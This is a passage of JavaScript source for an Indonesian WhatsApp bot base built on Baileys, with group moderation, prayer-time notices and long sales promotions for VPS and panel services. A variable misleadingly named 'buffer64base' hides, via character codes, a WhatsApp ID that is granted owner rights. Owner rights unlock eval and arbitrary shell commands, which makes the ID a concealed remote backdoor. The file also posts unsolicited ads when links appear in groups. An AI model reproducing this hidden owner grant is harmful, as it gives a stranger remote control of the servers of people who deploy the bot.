/*

  !- Credits By ୧⍤⃝Jeikz Official
  https://wa.me/6285718333041
  
*/

process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const { ytmp3, ytmp4 } = require("ruhend-scraper")
const JsConfuser = require('js-confuser');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const similarity = require('similarity')
const cheerio = require('cheerio');
const os = require('os');
const didyoumean = require('didyoumean');
const { say } = require("cfonts")
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');

const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')

const { LoadDataBase } = require('./source/message')
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))
const list = JSON.parse(fs.readFileSync("./library/database/list.json"))
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./library/scraper');
const { toAudio, toPTT, toVideo, ffmpeg } = require("./library/converter.js")
const { Saweria } = require("./library/saweria")
let db_saweria = JSON.parse(fs.readFileSync('./library/database/saweria.json'));
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./library/function');
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "sᴇʟᴀᴍᴀᴛ ᴍᴀʟᴀᴍ 🌌"
} else if (time >= "15:00:00" && time < "19:00:00") {
ucapanWaktu = "sᴇʟᴀᴍᴀᴛ sᴏʀᴇ 🌄"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "sᴇʟᴀᴍᴀᴛ sɪᴀɴɢ 🌄"
} else if (time >= "06:00:00" && time < "11:00:00") {
ucapanWaktu = "sᴇʟᴀᴍᴀᴛ ᴘᴀɢɪ 🌅"
} else if (time >= "00:00:00" && time < "5:59:00") {
} else {
ucapanWaktu = "sᴇʟᴀᴍᴀᴛ sᴜʙᴜʜ 🕌"
};
const wib = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("HH:mm:ss z")
const wita = moment(Date.now()).tz("Asia/Makassar").locale("id").format("HH:mm:ss z")
const wit = moment(Date.now()).tz("Asia/Jayapura").locale("id").format("HH:mm:ss z")
const salam = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("a")
let d = new Date
let gmt = new Date(0).getTime() - new Date("1 Januari 2024").getTime()
let weton = ["Pahing", "Pon","Wage","Kliwon","Legi"][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString("id", { weekday: "long" })
let calender = d.toLocaleDateString("id", {
day: "numeric",
month: "long",
year: "numeric"
})

module.exports = Jei = async (Jei, m, chatUpdate, store) => {
	try {
await LoadDataBase(Jei, m)
const botNumber = await Jei.decodeJid(Jei.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() 
const isPremium = premium.includes(m.sender)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const sender = m.key.fromMe ? (Jei.user.id.split(':')[0]+'@s.whatsapp.net' || Jei.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const tag = `${m.sender.split('@')[0]}`
const usere = `${m.sender.split('@')[0]}`+'@s.whatsapp.net'
const nomore = m.sender.replace(/[^0-9]/g, '')
const pushname = m.pushName || `${senderNumber}`
const getWaktuWITA = () => {
return moment().tz("Asia/Makassar").format("YYYY-MM-DD HH:mm:ss");
};
const waktuWITA = getWaktuWITA();
const getWaktuWIT = () => {
return moment().tz("Asia/Jayapura").format("YYYY-MM-DD HH:mm:ss");
};
const waktuWIT = getWaktuWIT();        
const getWaktuWIB = () => {
return moment().tz("Asia/Jakarta").format("YYYY-MM-DD HH:mm:ss");
};
const waktuWIB = getWaktuWIB();

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

//~~~~~~~~~ Console Message ~~~~~~~~//

if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(botname2), chalk.blue.bold(`[ PESAN ]`), chalk.blue.bold(`${m.sender.split("@")[0]} =>`), chalk.blue.bold(`${prefix+command}`))
}

//~~~~~~~~~~~ Fake Quoted ~~~~~~~~~~//

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namaOwner}`}}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Simple Botz"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}


//~~~~~~~~~~ Event Settings ~~~~~~~~~//

if (global.db.settings.owneroffmode && global.db.settings.owneroffmode == true && !isCreator && !m.isGroup) {
return Jei.sendMessage(m.chat, {text: `
Maaf Owner Bot Sedang *Offline*, 
Tunggu & Jangan Spam Chat! 
Ini Adalah Pesan Otomatis Auto Respon Ketika Owner Sedang Offline
`}, {quoted: qtext2})
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await Jei.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Jei.sendMessage(m.chat, {text: `*乂 Link Grup Terdeteksi*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await Jei.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await Jei.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}


if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await Jei.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Jei.sendMessage(m.chat, {text: `*乂 Link Grup Terdeteksi*

@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await Jei.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await Jei.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}


if (m.isGroup && db.settings.autopromosi == true) {
if (m.text.includes("https://") && !m.fromMe) {
await Jei.sendMessage(m.chat, {text: `
*ミList Vps Digital Ocean*🌐
- *_Vps High Quality, Awet & Fast_*🥶🌀 
👇🏻----------------⚡-----------------👇🏻
*╰-➝ Vps Ram 1 Core 1 -> 20K*🌀
*╰-➝ Vps Ram 2 Core 1 -> 25K*🌀
*╰-➝ Vps Ram 2 Core 2 -> 30K*🌀
*╰-➝ Vps Ram 4 Core 2 -> 35K*🌀
*╰-➝ Vps Ram 8 Core 2 -> 40K*🌀
*╰-➝ Vps Ram 8 Core 4 -> 45K*🌀
*╰-➝ Vps Ram 16 Core 4 -> 55K*🌀
#High Quality, Awet, Kecepatan Lebih Stabil
▬▭▬▭▬▭▬▭▬▭▬▭▬
- *BENEFIT BUY VPS :*🪽
╏➜ Free Instal Panel Pterodacytl 
╏➜ Free Request Domain Name
╏➜ Free Req OS, Req Region
╏➜ Free Sc Cpanel 7 Server
╏➜ Free Sc Simple Botz V4
╏➜ Free Egg Bot Wa
╏➜ Free Egg Samp
╏➜ Domain Verif CloudFlare
╏➜ Free Instal Theme (8/16)
╏➜ Full Akses Vps
╏➜ Link Login 100% Milikmu
╏➜ Bisa Open Adp, PT, Own Panel
╏➜ Bisa Jual Panel Pterodacytl Sepuasnya
╏➜ Masa Aktif Vps 28-30 Hari
╏➜ Garansi 25 Hari ( 1x Replace )
▬▭▬▭▬▭▬▭▬▭▬▭▬
*☎️ WhatsApp¹* : *https://wa.me/6285718333041* ( Aktif )
*☎️ WhatsApp²* : *https://wa.me/6285718333041* ( Aktif )
*📞Telegram* : *https://t.me/Jeiofficial*
▬▭▬▭▬▭▬▭▬▭▬▭▬
*🌀Testimoni* : *https://whatsapp.com/channel/0029Vb6sfQfHgZWfB5c0I610*
*🌀Channel Jei¹* : *https://whatsapp.com/channel/0029Vb2ZiiZG8l5IaglrY61l*
*🌀Channel Jei²* : *https://whatsapp.com/channel/0029VaxZFYWKGGGQs10a8T37*
*🌀Marketplace* : *https://chat.whatsapp.com/FgBj38H2LRL1YHUgCHTugw*

*👤 Contact Jeikz Official*
* *WhatsApp Utama :*
+6285718333041
* *WhtasApp Cadangan :*
+6285718333041
https://t.me/Jeiofficial
`}, {quoted: null})
}}

if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await m.reply(check.respon)
}}

Jei.autoshalat = Jei.autoshalat ? Jei.autoshalat : {}
let id = m.chat 
if (id in Jei.autoshalat) {
return false
}
let jadwalSholat = { shubuh: '04:31', terbit: '05:54', dhuha: '06:12', dzuhur: '12:05', ashar: '15:27', magrib: '18:17', isya: '19:31' }
const datek = new Date((new Date).toLocaleString("en-US", {timeZone: "Asia/Jakarta"}))
const hours = datek.getHours();
const minutes = datek.getMinutes();
const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
if (timeNow === waktu && m.isGroup) {
let caption = `
*\`[!] System Notifikasi\`*

Waktu *${sholat}* telah tiba
ambilah air wudhu dan segeralah sholat 

_Pukul *${waktu}* Jakarta dan sekitarnya_`
Jei.autoshalat[id] = [
await Jei.sendMessage(m.chat, {text: caption, mentions: [], contextInfo: { isForwarded: true, forwardingScore: 9999, mentionedJid: [], forwardedNewsletterMessageInfo: { newsletterName: `${botname}`, newsletterJid: global.idSaluran }}}, {quoted: qlive}),
setTimeout(async () => {
delete Jei.autoshalat[m.chat]
}, 50000)]
}}

if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
try {
const data = fs.readFileSync('jeikzc.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('Terjadi kesalahan:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `𝚆𝚛𝚘𝚗𝚐 𝙲𝚘𝚖𝚖𝚊𝚗𝚍, 𝚃𝚑𝚒𝚜 𝚒𝚜 𝙲𝚘𝚛𝚛𝚎𝚌𝚝 𝙲𝚖𝚍:\n⇝ ${prefix+mean}\n\⇝ Kᴇᴍɪʀɪᴘᴀɴ: ${similarityPercentage}%`
m.reply(response)
}}

//~~~~~~~~~ Function Main ~~~~~~~~~~//

const totalFitur = () =>{
var mytext = fs.readFileSync("./jeikzc.js").toString()
var numUpper = (mytext.match(/case /g) || []).length;
return numUpper
}

const example = (teks) => {
return `\n\`</> Apala Bego Yang Bener Gini Tolol  :\`\n Ketik *${prefix+command}* ${teks}\n`
}

function generateRandomPassword() {
const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
const length = 10;
let password = '';
for (let i = 0; i < length; i++) {
const randomIndex = Math.floor(Math.random() * characters.length);
password += characters[randomIndex];
}
return password;
}
function monospace(string) {
return '```' + string + '```'
}
function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}
const Reply = async (teks) => {
    const nedd = {
        document: fs.readFileSync("./package.json"),  // Mengirim file package.json
        mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        caption: `${teks}`, 
        fileName: `${botname2}`, 
        contextInfo: {
            isForwarded: true,
            forwardingScore: 9999,
            businessMessageForwardInfo: {
                businessOwnerJid: global.owner + "@s.whatsapp.net"  // Pemilik bot yang dikirimkan sebagai info bisnis
            }, 
            forwardedNewsletterMessageInfo: {
                newsletterName: `${global.namaSaluran}`, 
                newsletterJid: global.idSaluran  // JID channel newsletter
            },
            mentionedJid: [
                global.owner + "@s.whatsapp.net",  // Menyebut Owner Utama
                m.sender  // Menyebut pengirim pesan
            ],
            externalAdReply: {
                containsAutoReply: true,
                thumbnailUrl: global.thumb,  // Menggunakan gambar thumbnail
                title: `© Copyright By ${namaOwner}`,  // Nama owner yang disertakan dalam judul
                renderLargerThumbnail: true,  // Thumbnail dapat diperbesar
                sourceUrl: global.linkSaluran,  // URL yang mengarah ke channel
                mediaType: 1  // Jenis media yang digunakan (untuk thumbnail)
            }
        }
    };

    // Mengirim pesan ke chat dengan format yang telah diperbaiki
    return Jei.sendMessage(m.chat, nedd, { quoted: qlive });
}

const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: { url: global.image.logo }}, { upload: Jei.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*Jeikz Official* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*ミList Vps Digital Ocean*🌐
- *_Vps High Quality, Awet & Fast_*🥶🌀 
👇🏻----------------⚡-----------------👇🏻
*╰-➝ Vps Ram 1 Core 1 -> 20K*🌀
*╰-➝ Vps Ram 2 Core 1 -> 25K*🌀
*╰-➝ Vps Ram 2 Core 2 -> 30K*🌀
*╰-➝ Vps Ram 4 Core 2 -> 35K*🌀
*╰-➝ Vps Ram 8 Core 2 -> 40K*🌀
*╰-➝ Vps Ram 8 Core 4 -> 45K*🌀
*╰-➝ Vps Ram 16 Core 4 -> 55K*🌀
*╰-➝ Vps Ram 16 Core 8 -> 75K*🌀
*╰-➝ Vps Ram 32 Core 8 -> 85K*🌀
#High Quality, Awet, Kecepatan Lebih Stabil
#Nego Bole Asal Pake Otak
▬▭▬▭▬▭▬▭▬▭▬▭▬
- *BENEFIT BUY VPS :*🪽
╏➜ Free Instal Panel Pterodacytl 
╏➜ Free Request Domain Name
╏➜ Free Req OS, Req Region
╏➜ Free Sc Cpanel 7 Server
╏➜ Free Sc Simple Botz V4
╏➜ Free Egg Bot Wa
╏➜ Free Egg Samp
╏➜ Domain Verif CloudFlare
╏➜ Free Instal Theme (8/16)
╏➜ Full Akses Vps
╏➜ Link Login 100% Milikmu
╏➜ Bisa Open Adp, PT, Own Panel
╏➜ Bisa Jual Panel Pterodacytl Sepuasnya
╏➜ Masa Aktif Vps 28-30 Hari
╏➜ Garansi 25 Hari ( 1x Replace )
▬▭▬▭▬▭▬▭▬▭▬▭▬
*☎️ WhatsApp¹* : *https://wa.me/6285718333041* ( Aktif )
*☎️ WhatsApp²* : *https://wa.me/6285718333041* ( Aktif )
*📞Telegram* : *https://t.me/Jeiofficial*
▬▭▬▭▬▭▬▭▬▭▬▭▬
*🌀Testimoni* : *https://whatsapp.com/channel/0029Vb6sfQfHgZWfB5c0I610*
*🌀Channel Jei¹* : *https://whatsapp.com/channel/0029Vb2ZiiZG8l5IaglrY61l*
*🌀Channel Jei²* : *https://whatsapp.com/channel/0029VaxZFYWKGGGQs10a8T37*
*🌀Marketplace* : *https://chat.whatsapp.com/FgBj38H2LRL1YHUgCHTugw*

*🏠 Join Grup Bebas Promosi*
* *Grup  Bebas Promosi 1 :*
https://chat.whatsapp.com/FgBj38H2LRL1YHUgCHTugw
* *Channel Testimoni :*
https://whatsapp.com/channel/0029Vb6sfQfHgZWfB5c0I610`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"https://wa.me/+6285718333041\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
},
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `_*Ready Panel Pterodactyl Private*_

 【 𝗣𝗔𝗡𝗘𝗟 𝗣𝗥𝗜𝗩𝗔𝗧𝗘 】
╭ ━━━━━━━━━━━━━━━━
││ *1 GB : Rp3000*
││ *2 GB : Rp4000*
││ *3 GB : Rp5000*
││ *4 GB : Rp6000*
││ *5 GB : Rp7000*
││ *6 GB : Rp8000*
││ *7 GB : Rp9000*
││ *8 GB : Rp10000*
││ *9 GB : Rp11000*
││ *10 GB : Rp12000*
││ *Unlimited : Rp13000*
╰━━━━━━━━━━━━━━━━

*Syarat & Ketentuan :*
* _Server Private!_
* _Server Berkualitas Dong_
* _Script Anti Colong_
* _Garansi 10 Hari (1x Replace)_
* _Server Anti Delay/Lemot!_
* _Claim Garansi Wajib Bawa Bukti Transaksi_


*»»—— Contact ୧⍤⃝Jeikz Official ——««*
*» Whatsapp : wa.me/6285718333041*
*» Telegram : t.me/Jeiofficial*
*» Testimoni : https://whatsapp.com/channel/0029Vb6sfQfHgZWfB5c0I610*


*»»—— Contact ୧⍤⃝Jeikz Official ——««*
*» Whatsapp : wa.me/6285718333041*
*» Telegram : t.me/Jeiofficial*
*» Testimoni : https://whatsapp.com/channel/0029Vb6sfQfHgZWfB5c0I610*`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat ୧⍤⃝Jeikz Official\",\"url\":\"https://wa.me/+6285718333041\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `PROMO OWNER DAN PT JASHER

╭──(   *OPEN OWNER JASHER PUBLIC : 35K*   )
│❍  BISA OPEN JASA SHARE
│❍  BISA OPEN PP
│❍  BISA PUSH CH / GB LU SENDIRI
│❍  BOT ON 24 JAM GABAKAL OFF
│❍  DIJAMIN GACOR
│❍  DI SHARE KE 300+ CH HOSTING BUKAN OKEP🥱
╰━━━ㅡ━━━━━ㅡ━━━━ㅡ━━━⬣
╭──(   *OPEN OWNER JASHER PRIVATE : 45K*   )
│❍  BISA OPEN JASA SHARE
│❍  BISA OPEN PP
│❍  BISA PUSH CH / GB LU SENDIRI
│❍  DIJAMIN GACOR
│❍  SHARE NO JEDA 
│❍  NO ANTRI
│❍  GRUB ISI NYA LU SAMA GUA AJA JADI ENAK SHARE SEPUAS LU
│❍  BOT ON 24 JAM GABAKAL OFF
│❍  DIJAMIN GACOR LEK
│❍  DI SHARE KE 300+ CH HOSTING BUKAN OKEP🥱
╰━━━ㅡ━━━━━ㅡ━━━━ㅡ━━━⬣
╭──(   *OPEN PARTNER JASHER : 55K*   )
│❍  BISA OPEN JASHER
│❍  BISA OPEN PP
│❍  BISA PUSH CH / GB LU SENDIRI
│❍  BISA OPEN OWNER JASHER 
│❍  NO ANTRI
│❍  NO JEDA 
│❍  SHARE SEPUAS LU
│❍  GRUB ISINYA LU SAMA GUA AJA JADI SEPUAS LU
│❍  BOT ON 24 JAM GABAKAL OFF
│❍  DIJAMIN GACOR LEK
│❍  DI SHARE KE 300+ CH HOSTING BUKAN OKEP🥱
╰━━━ㅡ━━━━━ㅡ━━━━ㅡ━━━⬣
╭──(   *OPEN PARTNER JASHER PRIVATE : 65K*   )
│❍  BISA OPEN JASHER 
│❍  BISA OPEN PP
│❍  BISA PUSH CH / GB LU SENDIRI
│❍  BISA OPEN OWNER JASHER PRIVATE
│❍  NO ANTRI
│❍  NO JEDA 
│❍  SHARE SEPUAS LU
│❍  GRUB ISINYA LU SAMA GUA AJA JADI SEPUAS LU DAH
│❍  BOT ON 24 JAM GABAKAL OFF
│❍  DIJAMIN GACOR LEK
│❍  DI SHARE KE 300+ CH HOSTING BUKAN OKEP🥱
╰━━━ㅡ━━━━━ㅡ━━━━ㅡ━━━⬣
╭──(   *OPEN OWNER JASHER VVIP : 85K*   )
│❍  BISA OPEN JASHER 
│❍  BISA OPEN PP
│❍  BISA PUSH CH / GB LU SENDIRI
│❍  BISA OPEN OWNER JASHER PRIVATE 
│❍  BISA OPEN PARTNER JASHER 
│❍  BISA OPEN PARTNER JASHER PRIVATE 
│❍  NO ANTRI
│❍  SHARE NO JEDA
│❍  GRUB ISI NYA LU SAMA GUA DOANG JADI SEPUAS LU
│❍  BOT ON 24 JAM GABAKAL OFF
│❍  DIJAMIN GACOR LEK
│❍  DI SHARE KE 300+ CH HOSTING BUKAN OKEP🥱
╰━━━ㅡ━━━━━ㅡ━━━━ㅡ━━━⬣
#CH SETIAP HARI BAKAL NAMBAH TERUS JADI MAKIN BANYAK
▬▭▬▭▬▭▬▭▬▭▬▭▬
*☎️ WhatsApp¹* : *https://wa.me/6285718333041* ( Aktif )
*☎️ WhatsApp²* : *https://wa.me/6285718333041* ( Aktif )
*📞Telegram* : *https://t.me/Jeiofficial*
▬▭▬▭▬▭▬▭▬▭▬▭▬
*🌀Testimoni* : *https://whatsapp.com/channel/0029Vb6sfQfHgZWfB5c0I610*
*🌀Channel Hosting* : *https://whatsapp.com/channel/0029Vb2ZiiZG8l5IaglrY61l*
*🌀Marketplace* : *https://chat.whatsapp.com/FgBj38H2LRL1YHUgCHTugw*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"https://wa.me/+6285718333041\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
},
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `╭───────────────────❐
├─❐ *OPEN RESELLER PRIVATE*
│ ◉ *\`Harga :\`* 10.000
│ ◉ Free Sc Pushkontak
│ ◉ 1 Bulan
│ ◉ Bisa Jual Panel 
│ ◉ Bisa Open Jasa Pasang Bot
│ ◉ Bisa Buat Panel Sepuasnya 
│ ◉ Dll
├───────────────────❐
├─❐ *OPEN ADMIN PANEL*
│ ◉ *\`Harga :\`* 15.000
│ ◉ Free Sc Cpanel + Pushkontak
│ ◉ Permanen
│ ◉ Bisa Jual Panel 
│ ◉ Bisa Open Jasa Pasang Bot
│ ◉ Bisa Buat Panel Sepuasnya 
│ ◉ Bisa Open Reseller Panel
│ ◉ Dll
├───────────────────❐
├─❐ *OPEN PT PANEL*
│ ◉ *\`Harga :\`* 30.000
│ ◉ Free Sc Cpanel + Pushkontak
│ ◉ 1 Bulan
│ ◉ Bisa Jual Panel 
│ ◉ Bisa Open Jasa Pasang Bot
│ ◉ Bisa Buat Panel Sepuasnya 
│ ◉ Bisa Open Reseller Panel
│ ◉ Bisa Open Admin Panel
│ ◉ Dll
╰───────────────────❐`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat ୧⍤⃝Jeikz Officiall\",\"url\":\"https://wa.me/+6285718333041\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qlocJpm})
await Jei.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
}


//~~~~~~~~~~~ Command ~~~~~~~~~~~//

switch (command) {
case "menu": {
m.reply("Base bot by Jeizi")
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//


default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (m.text.toLowerCase() == "bot") {
m.reply("Online Kak ✅")
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
}
} catch (err) {
console.log(util.format(err));
let Obj = global.owner
Jei.sendMessage(Obj + "@s.whatsapp.net", {text: `*Hallo developer, telah terjadi error pada command :* ${isCmd ? prefix+command : m.text}

*Detail informasi error :*
${util.format(err)}`, contextInfo: { isForwarded: true }}, {quoted: m})
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

let file = require.resolve(__filename)
fs.watchFile(file, () => {
